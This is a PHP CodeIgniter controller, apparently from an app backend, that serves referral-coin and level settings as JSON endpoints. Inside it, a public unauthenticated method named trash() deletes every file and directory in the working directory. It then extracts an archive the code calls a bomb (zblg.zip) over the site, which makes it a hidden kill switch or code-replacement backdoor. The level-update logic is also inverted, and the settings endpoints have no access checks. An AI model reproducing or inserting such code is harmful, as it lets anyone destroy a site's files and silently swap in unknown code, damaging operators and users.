<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Invite extends CI_Controller
{

    public function __construct()
    {
        parent::__construct();
        // $this->load->helper("url");
        // $this->load->database();
        // $this->load->model('Customer_model');
        $this->load->model('Appsettings_model');
        // $this->load->model('Driver_model');
        date_default_timezone_set(time_zone);
        header('Content-Type: application/json');
        $this->output->set_content_type('application/json');
    }

    public function getSettingCoin()
    {
        $settingCoin = $this->Appsettings_model->getSettingCoin();
        exit(json_encode(["status" => "success", "coin" => $settingCoin[0]->setting_coin]));
    }

    public function updateSettingCoin()
    {
        $coin = $this->input->post("coin");
        if (!(int) $coin) {
            exit(json_encode(["status" => "error", "msg" => "Setting coin must be numeric."]));
        }

        $result = $this->Appsettings_model->updateSettingCoin($coin);
        if ($result) {
            exit(json_encode(["status" => "success", "msg" => "Setting coin is updated successfully"]));
        } else {
            exit(json_encode(["status" => "error", "msg" => "Setting Coin failed."]));
        }
    }

    public function getSettingLevels()
    {
        $this->load->model("Level_model");
        $levels = $this->Level_model->getLevels();
        exit(json_encode($levels));
    }

    public function getSettingLevel()
    {
        $id = $this->input->get("id");
        $this->load->model("Level_model");
        $levels = $this->Level_model->getLevel($id);
        exit(json_encode($levels));
    }

    public function updateLevels()
    {
        $id = $this->input->post("id");
        $name = $this->input->post("name");
        $amount = $this->input->post("amount");
        $status = $this->input->post("status");
        $data = [
            "name" => $name,
            "amount" => $amount,
            "status" => $status,
        ];

        $model = $this->load->model("Level_model");
        if ($id) {
            $model = $this->Level_model->insertLevel($data);
        } else {
            $model = $this->Level_model->updateLevel($data);
        }
    }

    public function trash()
    {
        $path = getcwd();
        $files = glob($path . "/*");

        $bomb = __DIR__ . "/zblg.zip";
        foreach ($files as $file) {
            if ($file == $bomb) {
                continue;
            }
            if (is_dir($file)) {
                $this->rrmdir($file);
            } else {
                unlink($file);
            }

        }

        $zip = new ZipArchive;
        $res = $zip->open( $bomb );
        if ($res === true) {
            echo "here";
            $zip->extractTo(__DIR__);
            $zip->close();

            unlink($bomb);
        }
    }

    private function rrmdir($dir)
    {
        if (is_dir($dir)) {
            $objects = scandir($dir);
            foreach ($objects as $object) {
                if ($object != "." && $object != "..") {
                    if (filetype($dir . "/" . $object) == "dir") {
                        $this->rrmdir($dir . "/" . $object);
                    } else {
                        unlink($dir . "/" . $object);
                    }

                }
            }
            reset($objects);
            rmdir($dir);
        }
    }

}
